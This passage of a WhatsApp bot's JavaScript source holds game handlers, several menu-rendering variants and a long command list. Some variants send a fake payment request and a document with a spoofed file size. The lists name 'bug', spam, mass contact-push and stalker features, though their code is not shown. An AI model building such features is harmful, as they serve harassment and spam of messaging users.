						delete game.tebakbom[m.sender];
					}, 120000)
				}
				replygcxeon(`*GUESS THE BOMB*\n\n${game.tebakbom[m.sender].board.join("")}\n\nChoose that number! and don't get hit by a bomb!\nBomb : ${game.tebakbom[m.sender].bomb}\nLife : ${game.tebakbom[m.sender].nyawa.join("")}`);
			}
			break
			case 'mathquiz': case 'math': {
				const { genMath, modes } = require('./lib/math');
				const inputMode = ['noob', 'easy', 'medium', 'hard','extreme','impossible','impossible2'];
				if (!text) return replygcxeon(`Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`)
				if (!inputMode.includes(text.toLowerCase())) return replygcxeon('Mode not found!')
				if (game.kuismath.hasOwnProperty(m.sender.split('@')[0])) return replygcxeon('There Are Still Unfinished Sessions!')
				let result = await genMath(text.toLowerCase())
				replygcxeon(`*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nTime: ${(result.waktu / 1000).toFixed(2)} detik`).then(() => {
					game.kuismath[m.sender.split('@')[0]] = {
						jawaban: result.jawaban,
						mode: text.toLowerCase()
					}
				})
				await sleep(result.waktu)
				if (game.kuismath.hasOwnProperty(m.sender.split('@')[0])) {
					replygcxeon('Time has run out\nAnswer: ' + game.kuismath[m.sender.split('@')[0]].jawaban)
					delete game.kuismath[m.sender.split('@')[0]]
				}
			}
			break
			
			// Menu
		    case 'menu': case 'help': case 'alive': {
            const timestampe = speed()
            const latensie = speed() - timestampe
            const a = db.users[sender]
            const me = m.sender
			const xmenu_oh = `
*╮─────「 الترحيب 」─────╭*
*│مرحبا: ${m.pushName ? m.pushName : 'No name'}*
*│الرقم: +${me.split('@')[0]}*
*│الايدي: @${m.sender.split('@')[0]}*
*│رتبتك: ${isVip ? 'مميز' : isPremium ? 'بريميم' : 'عضو'}*
*│فلوسك: ${isVip ? 'VIP' : isPremium ? 'PREMIUM' : 'FREE'}*
*╯──────────────────╰*
> -------------------------------------
*╮───「 معلومات الـبوت 」───╭*
*│السرعة: ${latensie.toFixed(4)} فالثانية*
*│مده التشغيل: ${runtime(process.uptime())}*
*│اسم البوت: ${global.botname}*
*│لا تنسي قبل اي امر ضيف: 「 ${xprefix} 」*
*╯──────────────────╰*
> -------------------------------------
*╮──────「 الوقـت 」─────╭*
*│التاريخ: ${xdate}*
*│اليوم: ${xday}*
*│الساعه: ${xtime}*
*╯──────────────────╰*
╭─┴❍「 *MENU* 」❍
│${setv} ${prefix}allmenu
│${setv} ${prefix}searchmenu
│${setv} ${prefix}downloadmenu
│${setv} ${prefix}gamemenu
│${setv} ${prefix}funmenu
│${setv} ${prefix}aimenu
│${setv} ${prefix}groupmenu
│${setv} ${prefix}ownermenu
│${setv} ${prefix}convertmenu
│${setv} ${prefix}listmenu
│${setv} ${prefix}religionmenu
│${setv} ${prefix}animemenu
│${setv} ${prefix}nsfwmenu
│${setv} ${prefix}randomphotomenu
│${setv} ${prefix}randomvideomenu
│${setv} ${prefix}stickermenu
│${setv} ${prefix}databasemenu
│${setv} ${prefix}storemenu
│${setv} ${prefix}stalkermenu
│${setv} ${prefix}bugmenu
│${setv} ${prefix}othermenu
╰──────❍`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    XeonBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    XeonBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    XeonBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    XeonBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	XeonBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }}, {
                        quoted: m
                    })
      } else if (typemenu === 'v9') {
                	XeonBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"قـائـمـة الاوامـر ⚡",
"sections":[{"title":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"},
{"header":"SEARCH MENU",
"title":"click to display",
"description":"Displays The List Of Search Features",
"id":"${prefix}searchmenu"},
{"header":"DOWNLOAD MENU",
"title":"click to display",
"description":"Displays The List Of Download Features",
"id":"${prefix}downloadmenu"},
{"header":"GAME MENU",
"title":"click to display",
"description":"Displays The List Of Game Features",
"id":"${prefix}gamemenu"},
{"header":"FUN MENU",
"title":"click to display",
"description":"Displays The List Of Fun Features",
"id":"${prefix}funmenu"},
{"header":"AI MENU",
"title":"click to display",
"description":"Displays The List Of AI Features",
"id":"${prefix}aimenu"},
{"header":"GROUP MENU",
"title":"click to display",
"description":"Displays The List Of Group Features",
"id":"${prefix}groupmenu"},
{"header":"OWNER MENU",
"title":"click to display",
"description":"Displays The List Of Owner Features",
"id":"${prefix}ownermenu"},
{"header":"CONVERT MENU",
"title":"click to display",
"description":"Displays The List Of Convert Features",
"id":"${prefix}convertmenu"},
{"header":"LIST MENU",
"title":"click to display",
"description":"Displays The List Of List Features",
"id":"${prefix}listmenu"},
{"header":"RELIGION MENU",
"title":"click to display",
"description":"Displays The List Of Religion Features",
"id":"${prefix}religionmenu"},
{"header":"NSFW MENU",
"title":"click to display",
"description":"Displays The List Of NSFW Features",
"id":"${prefix}nsfwmenu"},
{"header":"ANIME MENU",
"title":"click to display",
"description":"Displays The List Of Anime Features",
"id":"${prefix}animemenu"},
{"header":"RANDOM PHOTO MENU",
"title":"click to display",
"description":"Displays The List Of Random Photo Features",
"id":"${prefix}randomphotomenu"},
{"header":"RANDOM VIDEO MENU",
"title":"click to display",
"description":"Displays The List Of Random Video Features",
"id":"${prefix}randomvideomenu"},
{"header":"STICKER MENU",
"title":"click to display",
"description":"Displays The List Of Sticker Features",
"id":"${prefix}stickermenu"},
{"header":"DATABASE MENU",
"title":"click to display",
"description":"Displays The List Of Database Features",
"id":"${prefix}databasemenu"},
{"header":"STORE MENU",
"title":"click to display",
"description":"Displays The List Of Store Features",
"id":"${prefix}storemenu"},
{"header":"STALKER MENU",
"title":"click to display",
"description":"Displays The List Of Stalk Features",
"id":"${prefix}stalkermenu"},
{"header":"BUG MENU",
"title":"click to display",
"description":"Displays The List Of Bug Features",
"id":"${prefix}bugmenu"},
{"header":"OTHER MENU",
"title":"click to display",
"description":"Displays The List Of Other Features",
"id":"${prefix}othermenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'allmenu': {
let xmenu_oh = `
╭──❍「 *GREETING* 」❍
├ *Hi 👋*
├ *${m.pushName}* 
├ *${xeonytimewisher} 😄* 
╰─┬────❍ ${readmore}
╭─┴❍「 *GUIDE* 」❍
├ *🅞 = For Owner* 
├ *🅕 = For Free User*
├ *🅟 = For Premium User*
╰─┬────❍
╭─┴❍「 *Owner* 」❍
│${setv} ${prefix}addbadword 🅞
│${setv} ${prefix}delbadword 🅞
│${setv} ${prefix}autoread 🅞
│${setv} ${prefix}autobio 🅞
│${setv} ${prefix}autotype 🅞
│${setv} ${prefix}unavailable 🅞
│${setv} ${prefix}autorecord 🅞
│${setv} ${prefix}autorecordtype 🅞
│${setv} ${prefix}autoswview 🅞
│${setv} ${prefix}setautoblock 🅞
│${setv} ${prefix}setantiforeign 🅞
│${setv} ${prefix}autoblock 🅞
│${setv} ${prefix}onlygc 🅞
│${setv} ${prefix}onlypc 🅞
│${setv} ${prefix}onlyindia 🅞
│${setv} ${prefix}onlyindo 🅞
│${setv} ${prefix}anticall 🅞
│${setv} ${prefix}self 🅞
│${setv} ${prefix}public 🅞
│${setv} ${prefix}join 🅞
│${setv} ${prefix}poll 🅞
│${setv} ${prefix}spam 🅞
│${setv} ${prefix}bc 🅞
│${setv} ${prefix}bcgroup 🅞
│${setv} ${prefix}setmenu 🅞
│${setv} ${prefix}setimgmenu 🅞
│${setv} ${prefix}setvidmenu 🅞
│${setv} ${prefix}setgifmenu 🅞
│${setv} ${prefix}setreply 🅞
│${setv} ${prefix}resethit 🅞
│${setv} ${prefix}resetuser 🅞
│${setv} ${prefix}creategc 🅞
│${setv} ${prefix}setexif 🅞
│${setv} ${prefix}getexif 🅞
│${setv} ${prefix}getautoblocknumber 🅞
│${setv} ${prefix}getantiforeignnumber 🅞
│${setv} ${prefix}userjid 🅞
│${setv} ${prefix}setbotbio 🅞
│${setv} ${prefix}delppbot 🅞
│${setv} ${prefix}shutdown 🅞
│${setv} ${prefix}setppbot 🅞
│${setv} ${prefix}addprem 🅞
│${setv} ${prefix}delprem 🅞
│${setv} ${prefix}addowner 🅞
│${setv} ${prefix}delowner 🅞
│${setv} ${prefix}addvn 🅞
│${setv} ${prefix}addapk 🅞
│${setv} ${prefix}addzip 🅞
│${setv} ${prefix}addpdf 🅞
│${setv} ${prefix}delapk 🅞
│${setv} ${prefix}delzip 🅞
│${setv} ${prefix}delpdf 🅞
│${setv} ${prefix}delvn 🅞
│${setv} ${prefix}addsticker 🅞
│${setv} ${prefix}delsticker 🅞
│${setv} ${prefix}addimage 🅞
│${setv} ${prefix}delimage 🅞
│${setv} ${prefix}addvideo 🅞
│${setv} ${prefix}delvideo 🅞
│${setv} ${prefix}upswtext 🅞
│${setv} ${prefix}upswvideo 🅞
│${setv} ${prefix}upswimage 🅞
│${setv} ${prefix}upswaudio 🅞
│${setv} ${prefix}autosticker 🅞
│${setv} ${prefix}block 🅞
│${setv} ${prefix}unblock 🅞
│${setv} ${prefix}leavegc 🅞
│${setv} ${prefix}pushcontact 🅞
│${setv} ${prefix}pushcontactv2 🅞
│${setv} ${prefix}pushcontactv3 🅞
│${setv} ${prefix}jpm 🅞
│${setv} ${prefix}checkmember 🅞
│${setv} ${prefix}post 🅞
│${setv} ${prefix}clearchat 🅞
│${setv} ${prefix}setprefix 🅞
│${setv} $ 🅞
│${setv} > 🅞
│${setv} < 🅞
╰─┬────❍
╭─┴❍「 *Group* 」❍
│${setv} ${prefix}antibot 🅖
│${setv} ${prefix}antiviewonce 🅖
│${setv} ${prefix}readviewonce 🅖
│${setv} ${prefix}welcome 🅖
│${setv} ${prefix}adminevent 🅖
│${setv} ${prefix}groupevent 🅖
│${setv} ${prefix}antiforeign 🅖
│${setv} ${prefix}antimedia 🅖
│${setv} ${prefix}antiaudio 🅖
│${setv} ${prefix}antivideo 🅖
│${setv} ${prefix}antiimage 🅖
│${setv} ${prefix}antidocument 🅖
│${setv} ${prefix}antilocation 🅖
│${setv} ${prefix}anticontact 🅖
│${setv} ${prefix}antisticker 🅖
│${setv} ${prefix}antipoll 🅖
│${setv} ${prefix}antilink 🅖
│${setv} ${prefix}antipromotion 🅖
│${setv} ${prefix}antivirtex 🅖
│${setv} ${prefix}grouplink 🅖
│${setv} ${prefix}listadmin 🅖
│${setv} ${prefix}invite 🅖
│${setv} ${prefix}ephemeral 🅖
│${setv} ${prefix}delete 🅖
│${setv} ${prefix}setppgroup 🅖
│${setv} ${prefix}delppgroup 🅖
│${setv} ${prefix}setnamegc 🅖
│${setv} ${prefix}setdesc 🅖
│${setv} ${prefix}add 🅖
│${setv} ${prefix}kick 🅖
│${setv} ${prefix}promote 🅖
│${setv} ${prefix}demote 🅖
│${setv} ${prefix}kickall 🅖
│${setv} ${prefix}promoteall 🅖
│${setv} ${prefix}demoteall 🅖
│${setv} ${prefix}getcontact 🅞
│${setv} ${prefix}savecontact 🅞
│${setv} ${prefix}sendcontact 🅞
│${setv} ${prefix}contactag 🅞
│${setv} ${prefix}hidetag 🅖
│${setv} ${prefix}totag 🅖
│${setv} ${prefix}tagall 🅖
│${setv} ${prefix}editinfo 🅖
│${setv} ${prefix}opentime 🅖
│${setv} ${prefix}closetime 🅖
│${setv} ${prefix}resetlink 🅖
│${setv} ${prefix}getbio 🅖
│${setv} ${prefix}vote 🅖
│${setv} ${prefix}upvote 🅖
│${setv} ${prefix}downvote 🅖
│${setv} ${prefix}checkvote 🅖
│${setv} ${prefix}delvote 🅖
│${setv} ${prefix}antivirus 🅖
│${setv} ${prefix}antibadword 🅖
│${setv} ${prefix}nsfw 🅖
│${setv} ${prefix}react 🅖
│${setv} ${prefix}getjoinrequest 🅖
╰─┬────❍
╭─┴❍「 *Search* 」❍
│${setv} ${prefix}google 🅕
│${setv} ${prefix}wikipedia 🅕
│${setv} ${prefix}ytsearch 🅕
│${setv} ${prefix}xnxxsearch 🅕
│${setv} ${prefix}xvideosearch 🅕
│${setv} ${prefix}apksearch 🅕
│${setv} ${prefix}stickersearch 🅕
│${setv} ${prefix}imdb 🅕
│${setv} ${prefix}wanumber 🅕
│${setv} ${prefix}friend 🅕
│${setv} ${prefix}lyrics 🅕
│${setv} ${prefix}pixiv 🅕
╰─┬────❍
╭─┴❍「 *Download* 」❍
│${setv} ${prefix}xnxxdl 🅕
│${setv} ${prefix}xvideodl 🅕
│${setv} ${prefix}itunes 🅕
│${setv} ${prefix}play 🅕
│${setv} ${prefix}ytmp3 🅕
│${setv} ${prefix}ytmp4 🅕
│${setv} ${prefix}tiktok 🅕
│${setv} ${prefix}tiktokaudio 🅕
│${setv} ${prefix}tiktokvideo 🅕
│${setv} ${prefix}igvideo 🅕
│${setv} ${prefix}igimage 🅕
│${setv} ${prefix}facebook 🅕
│${setv} ${prefix}twitter 🅕
│${setv} ${prefix}apk 🅕
│${setv} ${prefix}mega 🅕
│${setv} ${prefix}mediafire 🅕
│${setv} ${prefix}google 🅕
│${setv} ${prefix}gimage 🅕
│${setv} ${prefix}weather 🅕
│${setv} ${prefix}spotify 🅟
│${setv} ${prefix}gitclone 🅕
│${setv} ${prefix}happymod 🅕
│${setv} ${prefix}gdrive 🅕
│${setv} ${prefix}pinterest 🅕
│${setv} ${prefix}ringtone 🅕
│${setv} ${prefix}autodownload 🅞
╰─┬────❍
╭─┴❍「 *Tool Menu* 」❍
│${setv} ${prefix}obfuscate 🅕
│${setv} ${prefix}styletext 🅕
│${setv} ${prefix}fliptext 🅕
│${setv} ${prefix}tts 🅕
│${setv} ${prefix}say 🅕
│${setv} ${prefix}togif 🅕
│${setv} ${prefix}toqr 🅕
│${setv} ${prefix}bass 🅕
│${setv} ${prefix}blown 🅕
│${setv} ${prefix}deep 🅕
│${setv} ${prefix}earrape 🅕
│${setv} ${prefix}fast 🅕
│${setv} ${prefix}fat 🅕
│${setv} ${prefix}nightcore 🅕
│${setv} ${prefix}reverse 🅕
│${setv} ${prefix}robot 🅕
│${setv} ${prefix}slow 🅕
│${setv} ${prefix}smooth 🅕
│${setv} ${prefix}squirrel 🅕
│${setv} ${prefix}tinyurl 🅕
│${setv} ${prefix}tovn 🅕
│${setv} ${prefix}t 🅕
│${setv} ${prefix}toaudio 🅕
│${setv} ${prefix}tomp3 🅕
│${setv} ${prefix}tomp4🅕
│${setv} ${prefix}toimg 🅕
│${setv} ${prefix}toonce 🅕
│${setv} ${prefix}toptv 🅕
│${setv} ${prefix}sticker 🅕
│${setv} ${prefix}smeme 🅕
│${setv} ${prefix}smeta 🅕
│${setv} ${prefix}take 🅟
│${setv} ${prefix}emojimix 🅕
│${setv} ${prefix}volaudio 🅕
│${setv} ${prefix}volvideo 🅕
│${setv} ${prefix}ebinary 🅕
│${setv} ${prefix}dbinary 🅕
│${setv} ${prefix}ssweb 🅕
│${setv} ${prefix}quoted 🅕
│${setv} ${prefix}translate 🅕
│${setv} ${prefix}get 🅕
│${setv} ${prefix}tourl 🅕
│${setv} ${prefix}write 🅕
╰─┬────❍
╭─┴❍「 *List Menu* 」❍
│${setv} ${prefix}listprem 🅕
│${setv} ${prefix}listowner 🅕
│${setv} ${prefix}liststicker 🅕
│${setv} ${prefix}listimage 🅕
│${setv} ${prefix}listvideo 🅕
│${setv} ${prefix}listvn 🅕
│${setv} ${prefix}listapk 🅕
│${setv} ${prefix}listzip 🅕
│${setv} ${prefix}listpdf 🅕
│${setv} ${prefix}listbadword 🅕
│${setv} ${prefix}listpc 🅕
│${setv} ${prefix}listgc 🅕
╰─┬────❍
╭─┴❍「 *Random Photo* 」❍
│${setv} ${prefix}aesthetic 🅕
│${setv} ${prefix}coffee 🅕
│${setv} ${prefix}wikimedia 🅕
│${setv} ${prefix}wallpaper 🅕
│${setv} ${prefix}art 🅕
│${setv} ${prefix}bts 🅕
│${setv} ${prefix}dogwoof 🅕
│${setv} ${prefix}catmeow 🅕
│${setv} ${prefix}lizardpic 🅕
│${setv} ${prefix}goosebird 🅕
│${setv} ${prefix}8ballpool 🅕
│${setv} ${prefix}cosplay 🅕
│${setv} ${prefix}hacker 🅕
│${setv} ${prefix}cyber 🅕
│${setv} ${prefix}gamewallpaper 🅕
│${setv} ${prefix}islamic 🅕
│${setv} ${prefix}jennie 🅕
│${setv} ${prefix}jiso 🅕
│${setv} ${prefix}satanic 🅕
│${setv} ${prefix}justina 🅕
│${setv} ${prefix}cartoon 🅕
│${setv} ${prefix}pentol 🅕
│${setv} ${prefix}cat 🅕
│${setv} ${prefix}kpop 🅕
│${setv} ${prefix}exo 🅕
│${setv} ${prefix}lisa 🅕
│${setv} ${prefix}space 🅕
│${setv} ${prefix}car 🅕
│${setv} ${prefix}technology 🅕
│${setv} ${prefix}bike 🅕
│${setv} ${prefix}shortquote 🅕
│${setv} ${prefix}antiwork 🅕
│${setv} ${prefix}hacking 🅕
│${setv} ${prefix}boneka 🅕
│${setv} ${prefix}rose 🅕
│${setv} ${prefix}ryujin 🅕
│${setv} ${prefix}ulzzangboy 🅕
│${setv} ${prefix}ulzzanggirl 🅕
│${setv} ${prefix}wallml 🅕
│${setv} ${prefix}wallphone 🅕
│${setv} ${prefix}mountain 🅕
│${setv} ${prefix}goose 🅕
│${setv} ${prefix}profilepic 🅕
│${setv} ${prefix}couplepp 🅕
│${setv} ${prefix}programming 🅕
│${setv} ${prefix}pubg 🅕
│${setv} ${prefix}blackpink 🅕
│${setv} ${prefix}randomboy 🅕  
│${setv} ${prefix}randomgirl 🅕
│${setv} ${prefix}hijab 🅕  
│${setv} ${prefix}chinese 🅕
│${setv} ${prefix}indo 🅕
│${setv} ${prefix}japanese 🅕
│${setv} ${prefix}korean 🅕
│${setv} ${prefix}malay 🅕
│${setv} ${prefix}thai 🅕
│${setv} ${prefix}vietnamese 🅕
╰─┬────❍
╭─┴❍「 *Random Video* 」❍
│${setv} ${prefix}tiktokgirl 🅕
│${setv} ${prefix}tiktoknukthy 🅕
│${setv} ${prefix}tiktokkayes 🅕
│${setv} ${prefix}tiktokpanrika 🅕
│${setv} ${prefix}tiktoknotnot 🅕
│${setv} ${prefix}tiktokghea 🅕
│${setv} ${prefix}tiktoksantuy 🅕
│${setv} ${prefix}tiktokbocil 🅕
╰─┬────❍
╭─┴❍「 *Stalker* 」❍
│${setv} ${prefix}tiktokstalk 🅕
│${setv} ${prefix}mlstalk 🅕
│${setv} ${prefix}npmstalk 🅕
│${setv} ${prefix}ghstalk 🅕
╰─┬────❍
╭─┴❍「 *OpenAI* 」❍
│${setv} ${prefix}blackboxai 🅕
│${setv} ${prefix}travel-assistant 🅕
│${setv} ${prefix}guru-ai 🅕
│${setv} ${prefix}emi-ai 🅕
│${setv} ${prefix}claude-ai 🅕
│${setv} ${prefix}hercai-cartoon 🅕
│${setv} ${prefix}hercai-animefy 🅕
│${setv} ${prefix}hercai-lexica 🅕
│${setv} ${prefix}hercai-prodia 🅕
│${setv} ${prefix}hercai-simurg 🅕
│${setv} ${prefix}hercai-raava 🅕
│${setv} ${prefix}hercai-shonin 🅕
│${setv} ${prefix}realistic 🅕
│${setv} ${prefix}3dmodel 🅕
│${setv} ${prefix}photoleap 🅕
│${setv} ${prefix}openai 🅕
│${setv} ${prefix}dalle 🅕
│${setv} ${prefix}ai 🅕
│${setv} ${prefix}remini 🅕
╰─┬────❍
╭─┴❍「 *Game* 」❍
│${setv} ${prefix}truth 🅕
│${setv} ${prefix}dare 🅕
│${setv} ${prefix}suit 🅕
│${setv} ${prefix}tictactoe 🅕
│${setv} ${prefix}math 🅕
│${setv} ${prefix}playbomb 🅕
│${setv} ${prefix}casino 🅕
│${setv} ${prefix}rob 🅕
│${setv} ${prefix}slot 🅕
│${setv} ${prefix}dice 🅕 
│${setv} ${prefix} profile 🅕
│${setv} ${prefix} claim 🅕
│${setv} ${prefix} tmoney 🅕
│${setv} ${prefix} tflimit 🅕
╰─┬────❍
╭─┴❍「 *Fun* 」❍
│${setv} ${prefix}define 🅕
│${setv} ${prefix}readmore 🅕
│${setv} ${prefix}fact 🅕
│${setv} ${prefix}couple 🅕
│${setv} ${prefix}soulmate 🅕
│${setv} ${prefix}stupidcheck 🅕
│${setv} ${prefix}handsomecheck 🅕
│${setv} ${prefix}uncleancheck 🅕
│${setv} ${prefix}hotcheck 🅕
│${setv} ${prefix}smartcheck 🅕
│${setv} ${prefix}greatcheck 🅕
│${setv} ${prefix}evilcheck 🅕
│${setv} ${prefix}dogcheck 🅕
│${setv} ${prefix}coolcheck 🅕
│${setv} ${prefix}waifucheck 🅕
│${setv} ${prefix}awesomecheck 🅕
│${setv} ${prefix}gaycheck 🅕
│${setv} ${prefix}cutecheck 🅕
│${setv} ${prefix}lesbiancheck 🅕
│${setv} ${prefix}hornycheck 🅕
│${setv} ${prefix}prettycheck 🅕
│${setv} ${prefix}lovelycheck 🅕
│${setv} ${prefix}uglycheck 🅕
│${setv} ${prefix}pick 🅕
│${setv} ${prefix}pickupline 🅕
│${setv} ${prefix}quotes 🅕
│${setv} ${prefix}can 🅕
│${setv} ${prefix}is 🅕
│${setv} ${prefix}when 🅕
│${setv} ${prefix}where 🅕
│${setv} ${prefix}what 🅕
│${setv} ${prefix}how 🅕
│${setv} ${prefix}rate 🅕
│${setv} ${prefix}cry 🅕
│${setv} ${prefix}kill 🅕
│${setv} ${prefix}hug 🅕
│${setv} ${prefix}pat 🅕
│${setv} ${prefix}lick 🅕 
│${setv} ${prefix}kiss 🅕
│${setv} ${prefix}bite 🅕
│${setv} ${prefix}yeet 🅕
│${setv} ${prefix}bully 🅕
│${setv} ${prefix}bonk 🅕
│${setv} ${prefix}wink 🅕
│${setv} ${prefix}poke 🅕
│${setv} ${prefix}nom 🅕
│${setv} ${prefix}slap 🅕
│${setv} ${prefix}smile 🅕 
│${setv} ${prefix}wave 🅕
│${setv} ${prefix}awoo 🅕
│${setv} ${prefix}blush 🅕
